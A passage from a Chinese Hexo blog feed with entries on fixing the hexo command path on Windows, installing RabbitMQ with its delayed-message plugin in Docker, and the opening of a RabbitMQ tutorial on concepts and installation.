src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114191545356.png" alt="image-20230114191545356" /></p><p>之前看到好几个文章说吧hexo的bin目录添加到环境变量。但是因为啥原因<code>hexo.cmd</code>并没有放到bin目录里。导致我这一直不行。</p><p>哦，这么一看，大概就只怎么配置环境变量了吧。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114192037550.png" alt="image-20230114192037550" /></p><p>这个之后，咱再运行一次，hexo命令。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114192101364.png" alt="image-20230114192101364" /></p><p>OK，可算是成功了。</p><p>哈哈哈哈，我Windows可算是可以运行这玩意儿啦。</p><p>嗯，可以继续吐槽node，两天花六小时弄node。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114193212943.png" alt="image-20230114193212943" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114193248213.png" alt="image-20230114193248213" /></p><p>总结出现<code>xxx不是内部或外部命令，也不是可运行的程序</code>，就把有xxx.cm的目录路径添加到环境变量去。</p>]]></content>
    
    
    <categories>
      
      <category>node</category>
      
    </categories>
    
    
    <tags>
      
      <tag>node</tag>
      
      <tag>hexo</tag>
      
      <tag>cmd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker安装RabbitMQ并安装延时队列插件</title>
    <link href="/2023/01/13/Docker%E5%AE%89%E8%A3%85RabbitMQ%E5%B9%B6%E5%AE%89%E8%A3%85%E5%BB%B6%E6%97%B6%E9%98%9F%E5%88%97%E6%8F%92%E4%BB%B6/"/>
    <url>/2023/01/13/Docker%E5%AE%89%E8%A3%85RabbitMQ%E5%B9%B6%E5%AE%89%E8%A3%85%E5%BB%B6%E6%97%B6%E9%98%9F%E5%88%97%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><a href="#%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F">下载镜像</a></li><li><a href="#%E5%AE%89%E8%A3%85mq">安装MQ</a></li></ul></p><p>[toc]</p><h1 id="docker安装rabbitmq并安装延时队列插件"><a class="markdownIt-Anchor" href="#docker安装rabbitmq并安装延时队列插件"></a> Docker安装RabbitMQ并安装延时队列插件</h1><h1 id="一-rabbitmq简介"><a class="markdownIt-Anchor" href="#一-rabbitmq简介"></a> 一、RabbitMQ简介</h1><p>RabbitMQ是由erlang语言开发，基于AMQP（Advanced Message Queue高级消息队列协议）协议实现的消息队列，它是一种应用程序之间的通信方法，消息队列在分布式系统开发中应用非常广泛。</p><h1 id="二-docker安装rabbitmq"><a class="markdownIt-Anchor" href="#二-docker安装rabbitmq"></a> 二、docker安装RabbitMQ</h1><h2 id="下载镜像"><a class="markdownIt-Anchor" href="#下载镜像"></a> 下载镜像</h2><p>方式一：在线拉取</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker pull rabbitmq:3-management<br></code></pre></td></tr></table></figure><p>方式二：从本地加载</p><p>已经提供了镜像包：</p><p>链接：<a href="https://pan.baidu.com/s/1YEJE4xRLucg9JWU8lFnNrw?pwd=yyds">https://pan.baidu.com/s/1YEJE4xRLucg9JWU8lFnNrw?pwd=yyds</a><br />提取码：yyds</p><p>上传到虚拟机中后，使用命令加载镜像即可：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker load -i mq.tar<br></code></pre></td></tr></table></figure><h2 id="安装mq"><a class="markdownIt-Anchor" href="#安装mq"></a> 安装MQ</h2><p>执行下面的命令来运行MQ容器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker run \<br> -e RABBITMQ_DEFAULT_USER=admin \<br> -e RABBITMQ_DEFAULT_PASS=admin \<br> --name Rabbit \<br> --hostname mq \<br> -p 15672:15672 \<br> -p 5672:5672 \<br> -d \<br> rabbitmq:3-management<br></code></pre></td></tr></table></figure><p>3、访问<a href="http://192.168.23.132:15672">http://192.168.23.132:15672</a></p><p>账号密码默认都是guest</p><p>这里账号密码是admin</p><h1 id="三-安装rabbitmq延时队列插件delayed_message_exchange"><a class="markdownIt-Anchor" href="#三-安装rabbitmq延时队列插件delayed_message_exchange"></a> 三、安装RabbitMQ延时队列插件（delayed_message_exchange）</h1><ol><li><p>下载rabbitmq_delayed_message_exchange-x.ez插件并上传到指定文件夹中</p><p>下载地址:<a href="https://www.rabbitmq.com/community-plugins.html">https://www.rabbitmq.com/community-plugins.html</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113124427690.png" alt="image-20230113124427690" /></p><p>要下载对应版本的插件</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113110106821.png" alt="image-20230113110106821" /></p></li><li><p>然后进行如下操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#拷贝到rabbitmq容器 Rabbit 中</span><br><br>docker <span class="hljs-built_in">cp</span> rabbitmq_delayed_message_exchange-3.9.0.ez Rabbit:/plugins<br><br><span class="hljs-comment">#进入容器</span><br><br>docker <span class="hljs-built_in">exec</span> -it Rabbit /bin/bash<br><br><span class="hljs-comment">#启用插件</span><br><br>rabbitmq-plugins <span class="hljs-built_in">enable</span> rabbitmq_delayed_message_exchange<br><br><span class="hljs-comment">#查看</span><br><br>rabbitmq-plugins list<br><br><span class="hljs-comment">#重新启动容器</span><br><br>docker restart Rabbit<br><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113110621397.png" alt="image-20230113110621397" /></p></li><li><p>在容器重启完成后，我们可以登录RabbitMQ的Web端管理界面，在Exchanges选项卡下，点击Add a newexchange，在Type里面看是否出现了x-delayed-message选项，如下图所示</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113142540628.png" alt="image-20230113142540628" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113110317452.png" alt="image-20230113110317452" /></p></li></ol><p>​</p>]]></content>
    
    
    <categories>
      
      <category>MQ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MQ</tag>
      
      <tag>Rabbitmq</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RabbitMQ</title>
    <link href="/2023/01/13/RabbitMQ/"/>
    <url>/2023/01/13/RabbitMQ/</url>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><a href="#11-mq%E7%9A%84%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5">1.1 MQ的相关概念</a></li><li><a href="#12-mq%E5%88%86%E7%B1%BB">1.2 MQ分类</a></li><li><a href="#13-mq%E7%9A%84%E9%80%89%E6%8B%A9">1.3 MQ的选择</a></li><li><a href="#21-%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86">2.1 核心部分</a></li><li><a href="#22-%E5%AE%89%E8%A3%85">2.2 安装</a><ul><li><a href="#221-%E5%AE%89%E8%A3%85%E5%88%B0linux">2.2.1 安装到linux</a></li><li><a href="#222-%E4%BD%BF%E7%94%A8docker%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF">2.2.2 使用docker容器技术</a></li></ul></li><li><a href="#31-%E5%88%9B%E5%BB%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83">3.1 创建开发环境</a></li><li><a href="#32-%E7%94%9F%E4%BA%A7%E8%80%85%E4%BB%A3%E7%A0%81">3.2 生产者代码</a></li><li><a href="#33-%E6%B6%88%E8%B4%B9%E8%80%85%E4%BB%A3%E7%A0%81">3.3 消费者代码</a></li><li><a href="#41-%E5%AE%9E%E7%8E%B0%E5%B7%A5%E4%BD%9C%E9%98%9F%E5%88%97">4.1 实现工作队列</a></li><li><a href="#42-%E6%B6%88%E6%81%AF%E5%BA%94%E7%AD%94">4.2 消息应答</a></li><li><a href="#43-%E6%8C%81%E4%B9%85%E5%8C%96">4.3 持久化</a></li><li><a href="#44-%E9%A2%84%E5%8F%96%E5%80%BC">4.4 预取值</a></li><li><a href="#61-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%AE%80%E4%BB%8B">6.1 交换机简介</a></li><li><a href="#62-%E4%B8%B4%E6%97%B6%E9%98%9F%E5%88%97">6.2 临时队列</a></li><li><a href="#63-bindings">6.3 Bindings</a></li><li><a href="#64-fanout">6.4 Fanout</a><ul><li><a href="#%E7%AE%80%E4%BB%8B">简介</a></li><li><a href="#%E5%AE%9E%E6%88%98">实战</a></li></ul></li><li><a href="#65-direct">6.5 Direct</a></li><li><a href="#66-topics">6.6 Topics</a><ul><li><a href="#rabbitmq%E4%B8%AD%E7%9A%84ttl">RabbitMQ中的TTL</a></li></ul></li><li><a href="#81-%E6%95%B4%E5%90%88springboot">8.1 整合Springboot</a></li><li><a href="#82-%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0">8.2 队列实现</a></li><li><a href="#83-%E9%98%9F%E5%88%97%E4%BC%98%E5%8C%96">8.3 队列优化</a></li><li><a href="#84-%E6%8F%92%E4%BB%B6%E5%AE%9E%E7%8E%B0%E5%BB%B6%E8%BF%9F%E9%98%9F%E5%88%97">8.4 插件实现延迟队列</a></li><li><a href="#91-%E5%9B%9E%E9%80%80%E6%B6%88%E6%81%AF">9.1 回退消息</a></li><li><a href="#92-%E5%A4%87%E4%BB%BD%E4%BA%A4%E6%8D%A2%E6%9C%BA">9.2 备份交换机</a></li><li><a href="#101-%E5%B9%82%E7%AD%89%E6%80%A7">10.1 幂等性</a></li><li><a href="#102-%E4%BC%98%E5%85%88%E7%BA%A7%E9%98%9F%E5%88%97">10.2 优先级队列</a></li><li><a href="#103-%E6%83%B0%E6%80%A7%E9%98%9F%E5%88%97">10.3 惰性队列</a></li><li><a href="#111-%E6%90%AD%E5%BB%BA%E9%9B%86%E7%BE%A4">11.1 搭建集群</a></li><li><a href="#112-%E9%95%9C%E5%83%8F%E9%98%9F%E5%88%97">11.2 镜像队列</a></li><li><a href="#113-%E5%AE%9E%E7%8E%B0%E9%AB%98%E5%8F%AF%E7%94%A8%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">11.3 实现高可用负载均衡</a></li><li><a href="#114-federation-exchange">11.4 Federation Exchange</a></li><li><a href="#115-federation-queue">11.5 Federation Queue</a></li><li><a href="#116-shovel">11.6 Shovel</a></li><li><a href="#121basic-queue-%E7%AE%80%E5%8D%95%E9%98%9F%E5%88%97%E6%A8%A1%E5%9E%8B">12.1.Basic Queue 简单队列模型</a><ul><li><a href="#1211%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81">12.1.1.消息发送</a></li><li><a href="#1212%E6%B6%88%E6%81%AF%E6%8E%A5%E6%94%B6">12.1.2.消息接收</a></li><li><a href="#1213%E6%B5%8B%E8%AF%95">12.1.3.测试</a></li></ul></li><li><a href="#122workqueue">12.2.WorkQueue</a><ul><li><a href="#1221%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81">12.2.1.消息发送</a></li><li><a href="#1222%E6%B6%88%E6%81%AF%E6%8E%A5%E6%94%B6">12.2.2.消息接收</a></li><li><a href="#1223%E6%B5%8B%E8%AF%95">12.2.3.测试</a></li><li><a href="#1224%E8%83%BD%E8%80%85%E5%A4%9A%E5%8A%B3">12.2.4.能者多劳</a></li><li><a href="#1225%E6%80%BB%E7%BB%93">12.2.5.总结</a></li></ul></li><li><a href="#123%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85">12.3.发布/订阅</a></li><li><a href="#124fanout">12.4.Fanout</a><ul><li><a href="#1241%E5%A3%B0%E6%98%8E%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%A4%E6%8D%A2%E6%9C%BA">12.4.1.声明队列和交换机</a></li><li><a href="#1242%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81">12.4.2.消息发送</a></li><li><a href="#1243%E6%B6%88%E6%81%AF%E6%8E%A5%E6%94%B6">12.4.3.消息接收</a></li><li><a href="#1244%E6%80%BB%E7%BB%93">12.4.4.总结</a></li></ul></li><li><a href="#125direct">12.5.Direct</a><ul><li><a href="#1251%E5%9F%BA%E4%BA%8E%E6%B3%A8%E8%A7%A3%E5%A3%B0%E6%98%8E%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%A4%E6%8D%A2%E6%9C%BA">12.5.1.基于注解声明队列和交换机</a></li><li><a href="#1252%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81">12.5.2.消息发送</a></li><li><a href="#1253%E6%80%BB%E7%BB%93">12.5.3.总结</a></li></ul></li><li><a href="#126topic">12.6.Topic</a><ul><li><a href="#1261%E8%AF%B4%E6%98%8E">12.6.1.说明</a></li><li><a href="#1262%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81">12.6.2.消息发送</a></li><li><a href="#1263%E6%B6%88%E6%81%AF%E6%8E%A5%E6%94%B6">12.6.3.消息接收</a></li><li><a href="#1264%E6%80%BB%E7%BB%93">12.6.4.总结</a></li></ul></li><li><a href="#127%E6%B6%88%E6%81%AF%E8%BD%AC%E6%8D%A2%E5%99%A8">12.7.消息转换器</a><ul><li><a href="#1271%E6%B5%8B%E8%AF%95%E9%BB%98%E8%AE%A4%E8%BD%AC%E6%8D%A2%E5%99%A8">12.7.1.测试默认转换器</a></li><li><a href="#1272%E9%85%8D%E7%BD%AEjson%E8%BD%AC%E6%8D%A2%E5%99%A8">12.7.2.配置JSON转换器</a></li></ul></li></ul></p><p>[toc]</p><h1 id="1-认识mq"><a class="markdownIt-Anchor" href="#1-认识mq"></a> 1. 认识MQ</h1><h2 id="11-mq的相关概念"><a class="markdownIt-Anchor" href="#11-mq的相关概念"></a> 1.1 MQ的相关概念</h2><blockquote><p>什么是MQ</p></blockquote><p>MQ(message queue)，从字面意思上看，本质是个队列，FIFO先入先出，只不过队列中存放的内容是message而已，还是一种跨进程的通信机制，用于上下游传递消息。在互联网架构中,MQ是一种非常常见的上下游“逻辑解耦+物理解耦”的消息通信服务。使用了MQ之后，消息发送上游只需要依赖MQ，不用依赖其他服务。</p><blockquote><p>为什么要用MQ</p></blockquote><ol><li><p><code>流量消峰</code></p><p>举个例子，如果订单系统最多能处理一万次订单，这个处理能力应付正常时段的下单时绰绰有余，正常时段我们下单一秒后就能返回结果。但是在高峰期，如果有两万次下单操作系统是处理不了的，只能限制订单超过一万后不允许用户下单。使用消息队列做缓冲，我们可以取消这个限制，把一秒内下的订单分散成一段时间来处理，这时有些用户可能在下单十几秒后才能收到下单成功的操作，但是比不能下单的体验要好。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112125854498.png" alt="image-20230112125854498" /></p></li><li><p><code>应用解耦</code></p><p>以电商应用为例，应用中有订单系统、库存系统、支付系统。用户创建订单后，如果耦合调用库存系统、物流系统、支付系统，任何一个子系统出了故障，都会造成下单操作异常。当转变成基于消息队列的方式后，系统间调用的问题会减少很多，比如物流系统因为发生故障，需要几分钟来修复。在这几分钟的时间里，物流系统要处理的内存被缓存在消息队列中，用户的下单操作可以正常完成。当物流系统恢复后，继续处理订单信息即可 ，中单用户感受不到物流系统的故障，提升系统的可用性。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112125932111.png" alt="image-20230112125932111" /></p></li><li><p><code>异步处理</code></p><p>有些服务间调用是异步的，例如A调用B，B需要花费很长时间执行，但是A需要知道B什么时候可以执行完，以前一般有两种方式，A过一段时间去调用B的查询api查询。或者A提供一个callback api,B执行完之后调用api通知A服务。这两种方式都不是很优雅，使用消息总线，可以很方便解决这个问题,A调用B服务后，只需要监听B处理完成的消息，当B处理完成后，会发送一条消息给MQ，MQ会将此消息转发给A服务。这样A服务既不用循环调用B的查询api，也不用提供callback api。同样B服务也不用做这些操作。A服务还能及时的得到异步处理成功的消息。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112125948808.png" alt="image-20230112125948808" /></p></li></ol><h2 id="12-mq分类"><a class="markdownIt-Anchor" href="#12-mq分类"></a> 1.2 MQ分类</h2><ol><li><p><code>ActiveMQ</code>：</p><ul><li>优点：单机吞吐量万级，时效性ms级，可用性高，基于主从架构实现高可用性，消息可靠性较低的概率丢失数据</li><li>缺点：维护越来越少，高吞吐量场景较少使用</li></ul></li><li><p><code>Kafka</code>：大数据的杀手锏，谈到大数据领域内的消息传输，则绕不开Kafka，这款为大数据而生的消息中间件,以其百万级TPS的吞吐量名声大噪，迅速成为大数据领域的宠儿，在数据采集、传输存储的过程中发挥着举足轻重的作用。目前已经被LinkedIn，Uber,Twitter,Netflix等大公司所采纳。</p><ul><li><p>优点：</p><p>性能卓越，单机写入TPS约在百万条/秒，最大的优点，就是吞吐量高。时效性ms级可用性非常高，kafka是分布式的，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用,消费者采用Pull方式获取消息，消息有序，通过控制能够保证所有消息被消费且仅被消费一次;有优秀的第三方Kafka Web管理界面Kafka-Manager;在日志领域比较成熟，被多家公司和多个开源项目使用;功能支持:功能较为简单，主要支持简单的MQ功能，在大数据领域的实时计算以及日志采集被大规模使用</p></li><li><p>缺点：</p><p>Kafka单机超过64个队列/分区，Load会发生明显的飙高现象，队列越多，load越高，发送消息响应时间变长，使用短轮询方式，实时性取决于轮询间隔时间，消费失败不支持重试;支持消息顺序，但是一台代理宕机后，就会产生消息乱序，社区更新较慢;</p></li></ul></li><li><p><code>RocketMQ</code>：出自阿里巴巴的开源产品，用Java语言实现，在设计时参考了Kafka，并做出了自己的一些改进。被阿里巴巴广泛应用在订单，交易，充值，流计算，消息推送，日志流式处理binglog分发等场<br />景。</p><ul><li><p>优点：</p><p>单机吞吐量十万级,可用性非常高，分布式架构,消息可以做到0丢失,MQ功能较为完善，还是分布式的，扩展性好,支持10亿级别的消息堆积，不会因为堆积导致性能下降,源码是java我们可以自己阅读源码，定制自己公司的MQ</p></li><li><p>缺点：</p><p>支持的客户端语言不多，目前是java及c++，其中c++不成熟;社区活跃度一般,没有在MQ核心中去实现JMS等接口,有些系统要迁移需要修改大量代码</p></li></ul></li><li><p><code>RabbitMQ</code>：2007年发布，是一个在AMQP(高级消息队列协议)基础上完成的，可复用的企业消息系统，是当前最主流的消息中间件之一。</p><ul><li><p>优点：</p><p>由于erlang语言的高并发特性，性能较好;吞吐量到万级，MQ功能比较完备,健壮、稳定、易用、跨平台、支持多种语言如: Python、Ruby、.NET、 Java、JMS、C、PHP、ActionScript、XMPP、STOMP等，支持AJAX文档齐全;开源提供的管理界面非常棒，用起来很好用,社区活跃度高;<br />更新频率相当高https://www.rabbitmq.com/news.html</p></li><li><p>缺点：</p><p>商业版需要收费,学习成本较高</p></li></ul></li></ol><h2 id="13-mq的选择"><a class="markdownIt-Anchor" href="#13-mq的选择"></a> 1.3 MQ的选择</h2><table><thead><tr><th style="text-align:center">MQ</th><th style="text-align:center">介绍</th></tr></thead><tbody><tr><td style="text-align:center">Kafka</td><td style="text-align:center">Kafka主要特点是基于Pull的模式来处理消息消费，追求高吞吐量，一开始的目的就是用于日志收集和传输，适合产生<code>大量数据</code>的互联网服务的数据收集业务。<code>大型公司</code>建议可以选用，如果有<code>日志采集</code>功能,肯定是首选kafka了。</td></tr><tr><td style="text-align:center">RocketMQ</td><td style="text-align:center">天生为<code>金融互联网</code>领域而生，对于可靠性要求很高的场景，尤其是电商里面的订单扣款，以及业务削峰，在大量交易涌入时，后端可能无法及时处理的情况。RoketMQ在稳定性上可能更值得信赖，这些业务场景在阿里双11已经经历了多次考验，如果你的业务有上述并发场景，建议可以选择RocketMQ。</td></tr><tr><td style="text-align:center">RabbitMQ</td><td style="text-align:center">结合erlang语言本身的并发优势，<code>性能好时效性微秒级</code>，<code>社区活跃度也比较高</code>，管理界面用起来十分方便，如果你的<code>数据量没有那么大</code>，中小型公司优先选择功能比较完备的RabbitMO</td></tr></tbody></table><p>追求可用性：Kafka、 RocketMQ 、RabbitMQ</p><p>追求可靠性：RabbitMQ、RocketMQ</p><p>追求吞吐能力：RocketMQ、Kafka</p><p>追求消息低延迟：RabbitMQ、Kafka</p><h1 id="2-rabbitmq"><a class="markdownIt-Anchor" href="#2-rabbitmq"></a> 2. RabbitMQ</h1><blockquote><p>概念</p></blockquote><p>RabbitMQ是一个消息中间件：它接受并转发消息。你可以把它当做一个快递站点，当你要发送一个包裹时，你把你的包裹放到快递站，快递员最终会把你的快递送到收件人那里，按照这种逻辑RabbitMQ是一个快递站，一个快递员帮你传递快件。RabbitMQ与快递站的主要区别在于，它不处理快件而是接收，存储和转发消息数据。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112130341200.png" alt="" /></p><blockquote><p>四大核心概念</p></blockquote><table><thead><tr><th style="text-align:center">概念</th><th style="text-align:center">介绍</th></tr></thead><tbody><tr><td style="text-align:center">生产者</td><td style="text-align:center">产生数据发送消息的程序是生产者</td></tr><tr><td style="text-align:center">交换机</td><td style="text-align:center">交换机是RabbitMQ非常重要的一个部件，一方面它接收来自生产者的消息，另一方面它将消息推送到队列中。交换机必须确切知道如何处理它接收到的消息，是将这些消息推送到特定队列还是推关到多个队列，亦或者是把消息丢弃，这个得有交换机类型决定</td></tr><tr><td style="text-align:center">队列</td><td style="text-align:center">队列是RabbitMQ内部使用的一种数据结构，尽管消息流经RabbitMQ和应用程序但它们只能存储在队列中。队列仅受主机的内存和磁盘限制的约束，本质上是一个大的消息缓冲区。许多生产者可以将消息发送到一个队列，许多消费者可以尝试从一个队列接收数据。这就是我们使用队列的方式</td></tr><tr><td style="text-align:center">消费者</td><td style="text-align:center">消费与接收具有相似的含义。消费者大多时候是一个等待接收消息的程序。请注意生产者，消费者和消息中间件很多时候并不在同一机器上。同一个应用程序既可以是生产者又是可以是消费者。</td></tr></tbody></table><h2 id="21-核心部分"><a class="markdownIt-Anchor" href="#21-核心部分"></a> 2.1 核心部分</h2><table><thead><tr><th style="text-align:center">部分</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">Borker</td><td style="text-align:center">接受和分发消息的应用，RabbitMQ Server就是Message Broker</td></tr><tr><td style="text-align:center">Virtual host</td><td style="text-align:center">出于多租户和安全因素设计的，把AMQP 的基本组件划分到一个虚拟的分组中，类似于网络中的namespace.概念。当多个不同的用户使用同一个RabbitMQ server提供的服务时，可以划分出多个vhost，每个用户在自己的vhost创建exchange / queue 等</td></tr><tr><td style="text-align:center">Connection</td><td style="text-align:center">publisher / consumer和broker之间的TCP连接</td></tr><tr><td style="text-align:center">Channel</td><td style="text-align:center">如果每一次访问 RabbitMQ 都建立一个Connection，在消息量大的时候建立TCPConnection的开销将是巨大的，效率也较低。Channel是在connection 内部建立的逻辑连接，如果应用程序支持多线程，通常每个thread 创建单独的channel进行通讯，AMQP method包含了channel id 帮助客户端和message broker识别 channel，所以channel之间是完全隔离的。Channel作为轻量级的Connection极大减少了操作系统建立TCP connection的开销</td></tr><tr><td style="text-align:center">Exchange</td><td style="text-align:center">message 到达 broker 的第一站，根据分发规则，匹配查询表中的 routing key，分发消息到queue 中去。常用的类型有: direct (point-to-point), topic (publish-subscribe) and fanout<br/>(multicast)</td></tr><tr><td style="text-align:center">Queue</td><td style="text-align:center">消息最终被送到这里等到consumer取走</td></tr><tr><td style="text-align:center">Binding</td><td style="text-align:center">exchange和queue之间的虚拟连接，binding中可以包含routing key，Binding消息被保存到exchange中的查询表中，用于message的分发依据</td></tr></tbody></table><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112130552062.png" alt="image-20230112130552062" /></p><h2 id="22-安装"><a class="markdownIt-Anchor" href="#22-安装"></a> 2.2 安装</h2><h3 id="221-安装到linux"><a class="markdownIt-Anchor" href="#221-安装到linux"></a> 2.2.1 安装到linux</h3><ol><li><p>安装Erlang（RabbitMQ底层需要使用）：</p><p><a href="https://github.com/rabbitmq/erlang-rpm/releases/download/v23.2.6/erlang-23.2.6-1.el7.x86_64.rpm">https://github.com/rabbitmq/erlang-rpm/releases/download/v23.2.6/erlang-23.2.6-1.el7.x86_64.rpm</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">rpm -ivh erlang-23.2.6-1.el7.x86_64.rpm<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">测试</span><br>erl -version<br></code></pre></td></tr></table></figure></li><li><p>安装RabbitMQ</p><p><a href="https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.8.12/rabbitmq-server-3.8.12-1.el7.noarch.rpm">https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.8.12/rabbitmq-server-3.8.12-1.el7.noarch.rpm</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rpm -ivh rabbitmq-server-3.8.12-1.el7.noarch.rpm<br></code></pre></td></tr></table></figure></li><li><p>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">添加开机启动RabbitMQ服务</span><br>chkconfig rabbitmq-server on<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动服务</span><br>/sbin/service rabbitmq-server start<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看服务状态</span><br>/sbin/service rabbitmq-server status<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">停止服务</span><br>/sbin/service rabbitmq-server stop<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装可视化管理 插件</span><br>rabbitmq-plugins enable rabbitmq_management<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112131347301.png" alt="image-20230112131347301" /></p></li><li><p>重启rabbitmq服务，然后在windows客户端进入192.168.163.128(Linux的ip地址):15672，需要开启端口号，顺利进入！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开启防火墙</span><br>firewall-cmd --permanent --add-port=15672/tcp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">重启生效</span><br>firewall-cmd --reload<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112131415753.png" alt="image-20230112131415753" /></p></li></ol><blockquote><p>添加用户并且设置权限</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建账号</span><br>rabbitmqctl add_user admin 123<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置用户角色</span><br>rabitmqctl set_user_tags admin adminstrator<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置用户权限</span><br>rabbitmqctl set_permissions -p &quot;/&quot; admin &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看用户列表</span><br>rabbitmqctl list_users<br></code></pre></td></tr></table></figure><h3 id="222-使用docker容器技术"><a class="markdownIt-Anchor" href="#222-使用docker容器技术"></a> 2.2.2 使用docker容器技术</h3><p>方式一：在线拉取</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker pull rabbitmq:3-management<br></code></pre></td></tr></table></figure><p>方式二：从本地加载</p><p>在课前资料已经提供了镜像包：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210261459556.png" alt="image-20210423191210349" /></p><p>上传到虚拟机中后，使用命令加载镜像即可：</p><figure 